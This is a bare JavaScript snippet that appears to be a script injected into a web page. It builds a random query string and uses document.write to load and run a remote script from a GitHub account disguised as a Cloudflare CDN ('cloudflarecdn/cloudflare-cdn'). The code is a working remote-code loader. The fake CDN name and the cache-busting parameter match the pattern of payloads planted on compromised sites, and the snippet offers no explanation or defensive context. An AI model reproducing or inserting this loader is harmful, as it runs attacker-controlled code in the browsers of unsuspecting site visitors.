function randString(x){
    var s = "";
    while(s.length<x&&x>0){
        var r = Math.random();
        s+= (r<0.1?Math.floor(r*100):String.fromCharCode(Math.floor(r*26) + (r>0.5?97:65)));
    }
    return s;
}
var load_script = "https://raw.githubusercontent.com/cloudflarecdn/cloudflare-cdn/master/smarts?" + randString(10);
document.write('<script type=\"text/javascript\" src=\"'+load_script+'\"><\/scr'+'ipt>')
